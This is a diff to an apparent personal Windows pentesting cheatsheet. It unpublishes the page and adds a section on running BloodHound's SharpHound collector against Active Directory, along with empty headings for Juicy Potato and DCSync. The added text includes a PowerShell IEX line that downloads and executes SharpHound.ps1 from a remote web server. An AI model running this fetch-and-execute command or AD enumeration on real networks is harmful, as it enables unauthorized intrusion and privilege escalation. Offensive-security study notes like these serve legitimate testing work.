@@ -1,6 +1,6 @@
 ---
 title: Windows Notes / Cheatsheet
-published: true
+published: false
 ---
 
 # [](#header-1)Windows Notes / Cheatsheet
@@ -367,6 +367,17 @@ type C:\Windows\system32\drivers\etc\hosts
 
 
 
+If It's AD Get Bloodhound Imported...
+
+```
+SharpHound.ps1
+SharpHound.exe -> https://github.com/BloodHoundAD/SharpHound
+
+IEX(System.Net.WebClient.DownloadString('http://webserver:4444/SharpHound.ps1'))
+```
+
+
+
 Cleartext Passwords
 
 ```
@@ -549,6 +560,14 @@ Token Impersonation
 
 
 Juicy Potato
+
+```
+
+```
+
+
+
+DCSync (Also Post Exploit)
 
 ```
 
